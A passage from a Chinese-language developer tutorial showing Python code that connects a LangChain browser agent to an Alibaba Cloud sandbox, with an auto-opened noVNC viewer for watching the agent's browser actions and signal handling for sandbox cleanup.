<span class="hljs-keyword">import</span> urllib.<span class="hljs-property">parse</span>
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> http.<span class="hljs-property">server</span>
<span class="hljs-keyword">import</span> socketserver
<span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> <span class="hljs-title class_">Path</span>
<span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv
<span class="hljs-keyword">from</span> langchain_agent <span class="hljs-keyword">import</span> create_browser_agent, get_sandbox_manager

# 加载环境变量
<span class="hljs-title function_">load_dotenv</span>()

# 全局 <span class="hljs-variable constant_">HTTP</span> 服务器实例
_http_server = <span class="hljs-title class_">None</span>
_http_port = <span class="hljs-number">8080</span>

# 全局清理标志，用于防止重复清理
_cleanup_done = <span class="hljs-title class_">False</span>


def <span class="hljs-title function_">start_http_server</span>():
    <span class="hljs-string">""</span><span class="hljs-string">"启动一个简单的 HTTP 服务器来提供 vnc.html"</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _http_server
    
    <span class="hljs-keyword">if</span> _http_server is not <span class="hljs-title class_">None</span>:
        <span class="hljs-keyword">return</span> _http_port
    
    <span class="hljs-attr">try</span>:
        current_dir = <span class="hljs-title class_">Path</span>(__file__).<span class="hljs-property">parent</span>.<span class="hljs-title function_">absolute</span>()
        
        <span class="hljs-keyword">class</span> <span class="hljs-title class_">VNCRequestHandler</span>(http.<span class="hljs-property">server</span>.<span class="hljs-property">SimpleHTTPRequestHandler</span>):
            def <span class="hljs-title function_">__init__</span>(self, *args, **kwargs):
                <span class="hljs-variable language_">super</span>().<span class="hljs-title function_">__init__</span>(*args, directory=<span class="hljs-title function_">str</span>(current_dir), **kwargs)
            
            def <span class="hljs-title function_">log_message</span>(self, format, *args):
                # 静默日志，避免输出过多信息
                pass
        
        # 尝试启动服务器
        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(_http_port, _http_port + <span class="hljs-number">10</span>):
            <span class="hljs-attr">try</span>:
                server = socketserver.<span class="hljs-title class_">TCPServer</span>((<span class="hljs-string">""</span>, port), <span class="hljs-title class_">VNCRequestHandler</span>)
                server.<span class="hljs-property">allow_reuse_address</span> = <span class="hljs-title class_">True</span>
                
                # 在后台线程中运行服务器
                def <span class="hljs-title function_">run_server</span>():
                    server.<span class="hljs-title function_">serve_forever</span>()
                
                thread = threading.<span class="hljs-title class_">Thread</span>(target=run_server, daemon=<span class="hljs-title class_">True</span>)
                thread.<span class="hljs-title function_">start</span>()
                
                _http_server = server
                <span class="hljs-keyword">return</span> port
            except <span class="hljs-title class_">OSError</span>:
                <span class="hljs-keyword">continue</span>
        
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">None</span>
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"启动 HTTP 服务器失败: {str(e)}"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">None</span>


def <span class="hljs-title function_">open_vnc_viewer</span>(<span class="hljs-attr">vnc_url</span>: str):
    <span class="hljs-string">""</span><span class="hljs-string">"
    自动打开 VNC 查看器并设置 VNC URL
    
    Args:
        vnc_url: VNC WebSocket URL
    "</span><span class="hljs-string">""</span>
    <span class="hljs-keyword">if</span> not <span class="hljs-attr">vnc_url</span>:
        <span class="hljs-keyword">return</span>
    
    <span class="hljs-attr">try</span>:
        # 获取当前文件所在目录
        current_dir = <span class="hljs-title class_">Path</span>(__file__).<span class="hljs-property">parent</span>.<span class="hljs-title function_">absolute</span>()
        vnc_html_path = current_dir / <span class="hljs-string">"vnc.html"</span>
        
        # 检查文件是否存在
        <span class="hljs-keyword">if</span> not vnc_html_path.<span class="hljs-title function_">exists</span>():
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"警告: vnc.html 文件不存在: {vnc_html_path}"</span>)
            <span class="hljs-title function_">print_vnc_info</span>(vnc_url)
            <span class="hljs-keyword">return</span>
        
        # 启动 <span class="hljs-variable constant_">HTTP</span> 服务器
        port = <span class="hljs-title function_">start_http_server</span>()
        
        <span class="hljs-keyword">if</span> <span class="hljs-attr">port</span>:
            # 编码 <span class="hljs-variable constant_">VNC</span> <span class="hljs-variable constant_">URL</span> 作为 <span class="hljs-variable constant_">URL</span> 参数
            encoded_url = urllib.<span class="hljs-property">parse</span>.<span class="hljs-title function_">quote</span>(vnc_url, safe=<span class="hljs-string">''</span>)
            
            # 构建 <span class="hljs-variable constant_">HTTP</span> <span class="hljs-variable constant_">URL</span>
            http_url = f<span class="hljs-string">"http://localhost:{port}/vnc.html?url={encoded_url}"</span>
            
            # 打开浏览器
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\n正在打开 VNC 查看器..."</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"HTTP 服务器运行在: http://localhost:{port}"</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"VNC URL: {vnc_url[:80]}..."</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"完整 URL: {http_url[:100]}..."</span>)
            webbrowser.<span class="hljs-title function_">open</span>(http_url)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"VNC 查看器已打开"</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"VNC URL 已通过 URL 参数自动设置，页面加载后会自动连接"</span>)
        <span class="hljs-attr">else</span>:
            # 如果 <span class="hljs-variable constant_">HTTP</span> 服务器启动失败，尝试使用 <span class="hljs-attr">file</span>:<span class="hljs-comment">// 协议</span>
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"HTTP 服务器启动失败，尝试使用文件协议..."</span>)
            encoded_url = urllib.<span class="hljs-property">parse</span>.<span class="hljs-title function_">quote</span>(vnc_url, safe=<span class="hljs-string">''</span>)
            file_url = f<span class="hljs-string">"file://{vnc_html_path}?url={encoded_url}"</span>
            webbrowser.<span class="hljs-title function_">open</span>(file_url)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"VNC 查看器已打开（使用文件协议）"</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"提示: 如果无法自动连接，请手动复制 VNC URL 到输入框"</span>)
        
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"自动打开 VNC 查看器失败: {str(e)}"</span>)
        <span class="hljs-title function_">print_vnc_info</span>(vnc_url)


def <span class="hljs-title function_">print_vnc_info</span>(<span class="hljs-attr">vnc_url</span>: str):
    <span class="hljs-string">""</span><span class="hljs-string">"打印 VNC 连接信息"</span><span class="hljs-string">""</span>
    <span class="hljs-keyword">if</span> not <span class="hljs-attr">vnc_url</span>:
        <span class="hljs-keyword">return</span>
    
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"VNC 可视化连接信息"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\nVNC URL: {vnc_url}"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n使用方式:"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"   1. 使用 noVNC 客户端连接"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"   2. 或在浏览器中访问 VNC 查看器页面"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"   3. 实时查看浏览器操作过程"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span> * <span class="hljs-number">60</span> + <span class="hljs-string">"\n"</span>)


def <span class="hljs-title function_">cleanup_sandbox</span>():
    <span class="hljs-string">""</span><span class="hljs-string">"
    清理 sandbox 资源
    
    这个函数可以被信号处理器、异常处理器和正常退出流程调用
    "</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _cleanup_done
    
    # 防止重复清理
    <span class="hljs-keyword">if</span> <span class="hljs-attr">_cleanup_done</span>:
        <span class="hljs-keyword">return</span>
    
    _cleanup_done = <span class="hljs-title class_">True</span>
    
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        <span class="hljs-keyword">if</span> manager.<span class="hljs-title function_">is_active</span>():
            <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
            <span class="hljs-title function_">print</span>(<span class="hljs-string">"正在清理 sandbox..."</span>)
            <span class="hljs-title function_">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
            result = manager.<span class="hljs-title function_">destroy</span>()
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"清理结果: {result}\n"</span>)
        <span class="hljs-attr">else</span>:
            <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n没有活动的 sandbox 需要清理\n"</span>)
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\n清理 sandbox 时出错: {str(e)}\n"</span>)


def <span class="hljs-title function_">signal_handler</span>(signum, frame):
    <span class="hljs-string">""</span><span class="hljs-string">"
    信号处理器，处理 Ctrl+C (SIGINT) 和其他信号
    
    Args:
        signum: 信号编号
        frame: 当前堆栈帧
    "</span><span class="hljs-string">""</span>
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n\n收到中断信号，正在清理资源..."</span>)
    <span class="hljs-title function_">cleanup_sandbox</span>()
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"清理完成"</span>)
    sys.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>)


def <span class="hljs-title function_">main</span>():
    <span class="hljs-string">""</span><span class="hljs-string">"主函数"</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _cleanup_done
    
    # 重置清理标志
    _cleanup_done = <span class="hljs-title class_">False</span>
    
    # 注册信号处理器，处理 <span class="hljs-title class_">Ctrl</span>+C (<span class="hljs-variable constant_">SIGINT</span>)
    signal.<span class="hljs-title function_">signal</span>(signal.<span class="hljs-property">SIGINT</span>, signal_handler)
    
    # 在 <span class="hljs-title class_">Windows</span> 上，<span class="hljs-variable constant_">SIGBREAK</span> 也可以处理
    <span class="hljs-keyword">if</span> <span class="hljs-title function_">hasattr</span>(signal, <span class="hljs-string">'SIGBREAK'</span>):
        signal.<span class="hljs-title function_">signal</span>(signal.<span class="hljs-property">SIGBREAK</span>, signal_handler)
    
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"LangChain + AgentRun Browser Sandbox 集成示例"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-title function_">print</span>()
    
    <span class="hljs-attr">try</span>:
        # 创建 <span class="hljs-title class_">Agent</span>
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"正在初始化 LangChain Agent..."</span>)
        agent = <span class="hljs-title function_">create_browser_agent</span>()
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"Agent 初始化完成\n"</span>)
        
        # 示例查询
        queries = [
            <span class="hljs-string">"创建一个浏览器 sandbox"</span>,
            <span class="hljs-string">"获取当前 sandbox 的信息，包括 VNC URL"</span>,
            <span class="hljs-string">"导航到 https://www.aliyun.com"</span>,
            <span class="hljs-string">"截取当前页面截图"</span>,
        ]
        
        # 执行查询
        <span class="hljs-keyword">for</span> i, query <span class="hljs-keyword">in</span> <span class="hljs-title function_">enumerate</span>(queries, <span class="hljs-number">1</span>):
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\n{'=' * 60}"</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"查询 {i}: {query}"</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"{'=' * 60}\n"</span>)
            
            <span class="hljs-attr">try</span>:
                result = agent.<span class="hljs-title function_">invoke</span>({
                    <span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: query}]
                })
                
                # 提取最后一条消息的内容
                output = result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"messages"</span>, [])[-<span class="hljs-number">1</span>].<span class="hljs-property">content</span> <span class="hljs-keyword">if</span> <span class="hljs-title function_">isinstance</span>(result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"messages"</span>), list) <span class="hljs-keyword">else</span> result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"output"</span>, <span class="hljs-title function_">str</span>(result))
                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\n结果:\n{output}\n"</span>)
                
                # 如果是创建 sandbox，自动打开 <span class="hljs-variable constant_">VNC</span> 查看器
                <span class="hljs-keyword">if</span> i == <span class="hljs-number">1</span>:
                    <span class="hljs-attr">try</span>:
                        # 等待一下确保 sandbox 完全创建
                        <span class="hljs-keyword">import</span> time
                        time.<span class="hljs-title function_">sleep</span>(<span class="hljs-number">1</span>)
                        
                        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
                        <span class="hljs-keyword">if</span> manager.<span class="hljs-title function_">is_active</span>():
                            info = manager.<span class="hljs-title function_">get_info</span>()
                            vnc_url = info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>)
                            <span class="hljs-keyword">if</span> <span class="hljs-attr">vnc_url</span>:
                                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\n检测到 VNC URL: {vnc_url[:80]}..."</span>)
                                <span class="hljs-title function_">open_vnc_viewer</span>(vnc_url)
                                <span class="hljs-title function_">print_vnc_info</span>(vnc_url)
                            <span class="hljs-attr">else</span>:
                                <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n警告: 未获取到 VNC URL，请检查 sandbox 创建是否成功"</span>)
                    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
                        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"打开 VNC 查看器时出错: {str(e)}"</span>)
                        <span class="hljs-keyword">import</span> traceback
                        traceback.<span class="hljs-title function_">print_exc</span>()
                
                # 如果是获取信息，显示 <span class="hljs-variable constant_">VNC</span> 信息
                elif i == <span class="hljs-number">2</span>:
                    <span class="hljs-attr">try</span>:
                        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
                        <span class="hljs-keyword">if</span> manager.<span class="hljs-title function_">is_active</span>():
                            info = manager.<span class="hljs-title function_">get_info</span>()
                            <span class="hljs-keyword">if</span> info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>):
                                <span class="hljs-title function_">print_vnc_info</span>(info[<span class="hljs-string">'vnc_url'</span>])
                    <span class="hljs-attr">except</span>:
                        pass
            
            except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"查询失败: {str(e)}\n"</span>)
                <span class="hljs-keyword">import</span> traceback
                traceback.<span class="hljs-title function_">print_exc</span>()
        
        # 交互式查询
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"进入交互模式（输入 'quit' 或 'exit' 退出，Ctrl+C 或 Ctrl+D 中断）"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span> + <span class="hljs-string">"\n"</span>)
        
        <span class="hljs-keyword">while</span> <span class="hljs-title class_">True</span>:
            <span class="hljs-attr">try</span>:
                user_input = <span class="hljs-title function_">input</span>(<span class="hljs-string">"请输入您的查询: "</span>).<span class="hljs-title function_">strip</span>()
            except <span class="hljs-title class_">EOFError</span>:
                # 处理 <span class="hljs-title class_">Ctrl</span>+D (<span class="hljs-variable constant_">EOF</span>)
                <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n\n检测到输入结束 (Ctrl+D)，正在清理资源..."</span>)
                <span class="hljs-title function_">cleanup_sandbox</span>()
                <span class="hljs-title function_">print</span>(<span class="hljs-string">"清理完成"</span>)
                <span class="hljs-keyword">break</span>
            except <span class="hljs-title class_">KeyboardInterrupt</span>:
                # 处理 <span class="hljs-title class_">Ctrl</span>+C (在 input 调用期间)
                <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n\n检测到中断信号 (Ctrl+C)，正在清理资源..."</span>)
                <span class="hljs-title function_">cleanup_sandbox</span>()
                <span class="hljs-title function_">print</span>(<span class="hljs-string">"清理完成"</span>)
                <span class="hljs-keyword">break</span>
            
            <span class="hljs-keyword">if</span> not <span class="hljs-attr">user_input</span>:
                <span class="hljs-keyword">continue</span>
            
            <span class="hljs-keyword">if</span> user_input.<span class="hljs-title function_">lower</span>() <span class="hljs-keyword">in</span> [<span class="hljs-string">'quit'</span>, <span class="hljs-string">'exit'</span>, <span class="hljs-string">'退出'</span>]:
                <span class="hljs-title function_">print</span>(<span class="hljs-string">"\nBye"</span>)
                # 退出前清理 sandbox
                <span class="hljs-title function_">cleanup_sandbox</span>()
                <span class="hljs-keyword">break</span>
            
            <span class="hljs-attr">try</span>:
                result = agent.<span class="hljs-title function_">invoke</span>({
                    <span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: user_input}]
                })
                
                output = result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"messages"</span>, [])[-<span class="hljs-number">1</span>].<span class="hljs-property">content</span> <span class="hljs-keyword">if</span> <span class="hljs-title function_">isinstance</span>(result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"messages"</span>), list) <span class="hljs-keyword">else</span> result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"output"</span>, <span class="hljs-title function_">str</span>(result))
                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\n结果:\n{output}\n"</span>)
                
                # 检查是否需要打开或显示 <span class="hljs-variable constant_">VNC</span> 信息
                user_input_lower = user_input.<span class="hljs-title function_">lower</span>()
                <span class="hljs-keyword">if</span> <span class="hljs-string">"创建"</span> <span class="hljs-keyword">in</span> user_input_lower and <span class="hljs-string">"sandbox"</span> <span class="hljs-keyword">in</span> <span class="hljs-attr">user_input_lower</span>:
                    # 如果是创建 sandbox，自动打开 <span class="hljs-variable constant_">VNC</span> 查看器
                    <span class="hljs-attr">try</span>:
                        # 等待一下确保 sandbox 完全创建
                        <span class="hljs-keyword">import</span> time
                        time.<span class="hljs-title function_">sleep</span>(<span class="hljs-number">1</span>)
                        
                        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
                        <span class="hljs-keyword">if</span> manager.<span class="hljs-title function_">is_active</span>():
                            info = manager.<span class="hljs-title function_">get_info</span>()
                            vnc_url = info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>)
                            <span class="hljs-keyword">if</span> <span class="hljs-attr">vnc_url</span>:
                                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\n检测到 VNC URL: {vnc_url[:80]}..."</span>)
                                <span class="hljs-title function_">open_vnc_viewer</span>(vnc_url)
                                <span class="hljs-title function_">print_vnc_info</span>(vnc_url)
                            <span class="hljs-attr">else</span>:
                                <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n警告: 未获取到 VNC URL，请检查 sandbox 创建是否成功"</span>)
                    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
                        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"打开 VNC 查看器时出错: {str(e)}"</span>)
                        <span class="hljs-keyword">import</span> traceback
                        traceback.<span class="hljs-title function_">print_exc</span>()
                elif <span class="hljs-string">"sandbox"</span> <span class="hljs-keyword">in</span> user_input_lower or <span class="hljs-string">"vnc"</span> <span class="hljs-keyword">in</span> <span class="hljs-attr">user_input_lower</span>:
                    # 其他情况只显示信息
                    <span class="hljs-attr">try</span>:
                        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
                        <span class="hljs-keyword">if</span> manager.<span class="hljs-title function_">is_active</span>():
                            info = manager.<span class="hljs-title function_">get_info</span>()
                            <span class="hljs-keyword">if</span> info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>):
                                <span class="hljs-title function_">print_vnc_info</span>(info[<span class="hljs-string">'vnc_url'</span>])
                    <span class="hljs-attr">except</span>:
                        pass
            
            except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"查询失败: {str(e)}\n"</span>)
                <span class="hljs-keyword">import</span> traceback
                traceback.<span class="hljs-title function_">print_exc</span>()
        
        # 清理资源（仅在程序正常退出时）
        <span class="hljs-title function_">cleanup_sandbox</span>()
    
    except <span class="hljs-title class_">KeyboardInterrupt</span>:
        # 处理顶层 <span class="hljs-title class_">KeyboardInterrupt</span> (<span class="hljs-title class_">Ctrl</span>+C)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n\n检测到中断信号 (Ctrl+C)，正在清理资源..."</span>)
        <span class="hljs-title function_">cleanup_sandbox</span>()
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"清理完成"</span>)
        sys.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>)
    except <span class="hljs-title class_">EOFError</span>:
        # 处理顶层 <span class="hljs-title class_">EOFError</span> (<span class="hljs-title class_">Ctrl</span>+D)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n\n检测到输入结束 (Ctrl+D)，正在清理资源..."</span>)
        <span class="hljs-title function_">cleanup_sandbox</span>()
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"清理完成"</span>)
        sys.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>)
    except <span class="hljs-title class_">ValueError</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"配置错误: {str(e)}"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n提示: 请确保已设置以下环境变量:"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"   - DASHSCOPE_API_KEY: DashScope API Key"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"   - ALIBABA_CLOUD_ACCOUNT_ID: 阿里云账号 ID"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"   - ALIBABA_CLOUD_ACCESS_KEY_ID: 访问密钥 ID"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"   - ALIBABA_CLOUD_ACCESS_KEY_SECRET: 访问密钥 Secret"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"   - ALIBABA_CLOUD_REGION: 区域（默认: cn-hangzhou）"</span>)
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"发生错误: {str(e)}"</span>)
        <span class="hljs-keyword">import</span> traceback
        traceback.<span class="hljs-title function_">print_exc</span>()
        # 发生错误时也尝试清理
        <span class="hljs-title function_">cleanup_sandbox</span>()


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-title function_">main</span>()
</code></pre>
<p><strong>关键功能：</strong></p>
<ol>
<li><strong>VNC 自动打开</strong>: 创建 Sandbox 后自动打开 VNC 查看器</li>
<li><strong>信号处理</strong>: 捕获 Ctrl+C，确保资源正确清理</li>
<li><strong>交互模式</strong>: 支持持续对话，复用 Sandbox 实例</li>
</ol>
<h5 data-id="heading-18">VNC 可视化集成</h5>
<p>VNC（Virtual Network Computing）功能允许您实时查看和监控浏览器在 Sandbox 中的操作过程，这对于调试和监控 Agent 行为非常有用。</p>
<p><strong>获取 VNC URL：</strong></p>
<p>创建 Sandbox 后，可以通过 <code>get_sandbox_info</code> tool 获取 VNC URL：</p>
<pre><code class="hljs language-typescript" lang="typescript"># 通过 <span class="hljs-title class_">Agent</span> 调用
result = agent.<span class="hljs-title function_">invoke</span>({
    <span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"获取 sandbox 信息"</span>}]
})

# 或直接通过管理器获取
manager = <span class="hljs-title function_">get_sandbox_manager</span>()
info = manager.<span class="hljs-title function_">get_info</span>()
vnc_url = info[<span class="hljs-string">'vnc_url'</span>]
</code></pre>
<p><strong>自动打开 VNC 查看器：</strong></p>
<p>在 <code>main.py</code> 中，我们实现了自动打开 VNC 查看器的功能：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> webbrowser
<span class="hljs-keyword">import</span> urllib.<span class="hljs-property">parse</span>
<span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> <span class="hljs-title class_">Path</span>

def <span class="hljs-title function_">open_vnc_viewer</span>(<span class="hljs-attr">vnc_url</span>: str):
    <span class="hljs-string">""</span><span class="hljs-string">"自动打开 VNC 查看器"</span><span class="hljs-string">""</span>
    current_dir = <span class="hljs-title class_">Path</span>(__file__).<span class="hljs-property">parent</span>.<span class="hljs-title function_">absolute</span>()
    vnc_html_path = current_dir / <span class="hljs-string">"vnc.html"</span>
    
    <span class="hljs-keyword">if</span> vnc_html_path.<span class="hljs-title function_">exists</span>():
        # 通过 <span class="hljs-variable constant_">URL</span> 参数传递 <span class="hljs-variable constant_">VNC</span> <span class="hljs-variable constant_">URL</span>
        encoded_url = urllib.<span class="hljs-property">parse</span>.<span class="hljs-title function_">quote</span>(vnc_url, safe=<span class="hljs-string">''</span>)
        file_url = f<span class="hljs-string">"file://{vnc_html_path}?url={encoded_url}"</span>
        webbrowser.<span class="hljs-title function_">open</span>(file_url)
</code></pre>
<p><strong>VNC HTML 页面：</strong></p>
<p><code>vnc.html</code> 页面会从 URL 参数中读取 VNC URL，并自动连接到 VNC 服务器。页面包含以下核心功能：</p>
<ol>
<li><strong>noVNC 库加载</strong>: 从 CDN 动态加载 noVNC 客户端库</li>
<li><strong>自动连接</strong>: 读取 URL 参数中的 VNC URL 并自动连接</li>
<li><strong>状态显示</strong>: 显示连接状态（连接中、已连接、已断开）</li>
<li><strong>手动控制</strong>: 支持手动输入 VNC URL、断开重连等操作</li>
</ol>
<p>核心 JavaScript 代码片段：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 从 URL 参数获取 VNC URL</span>
<span class="hljs-keyword">const</span> urlParams = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>);
<span class="hljs-keyword">const</span> vncUrl = urlParams.<span class="hljs-title function_">get</span>(<span class="hljs-string">'url'</span>);

<span class="hljs-comment">// 加载 noVNC 库</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadNoVNC</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'https://cdn.jsdelivr.net/gh/novnc/noVNC@v1.4.0/core/rfb.js'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">module</span>.<span class="hljs-property">default</span>;
}

<span class="hljs-comment">// 连接 VNC</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">connectVNC</span>(<span class="hljs-params">url</span>) {
    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">RFB</span> = <span class="hljs-keyword">await</span> <span class="hljs-title function_">loadNoVNC</span>();
    rfb = <span class="hljs-keyword">new</span> <span class="hljs-title function_">RFB</span>(vncScreen, url, {
        <span class="hljs-attr">shared</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">credentials</span>: { <span class="hljs-attr">password</span>: <span class="hljs-string">''</span> }
    });
    
    rfb.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'connect'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'VNC 连接成功'</span>);
    });
}
</code></pre>
<p>完整的 <code>vnc.html</code> 文件可以在示例代码仓库中获取。</p>
<p><strong>手动使用 VNC 查看器：</strong></p>
<p>如果自动打开失败，您也可以手动使用 VNC 查看器：</p>
<ol>
<li><strong>使用 noVNC 在线客户端</strong>:
<ul>
<li>访问 <a href="https://link.juejin.cn?target=https%3A%2F%2Fnovnc.com%2FnoVNC%2Fvnc.html" target="_blank" title="https://novnc.com/noVNC/vnc.html" ref="nofollow noopener noreferrer">noVNC 在线客户端</a></li>
<li>在连接设置中填入 VNC URL</li>
<li>点击连接</li>
</ul>
</li>
<li><strong>使用本地 VNC HTML 页面</strong>:
<ul>
<li>打开 <code>vnc.html</code></li>
<li>输入 VNC URL</li>
<li>点击连接按钮</li>
</ul>
</li>
</ol>
<p><strong>实时监控功能：</strong></p>
<ul>
<li>所有浏览器操作都会在 VNC 中实时显示</li>
<li>可以看到 Agent 的每一步操作（导航、点击、输入等）</li>
<li>方便调试和监控 Agent 行为</li>
<li>支持交互式操作（在 VNC 中直接操作浏览器）</li>
</ul>
<h5 data-id="heading-19">运行和测试</h5>
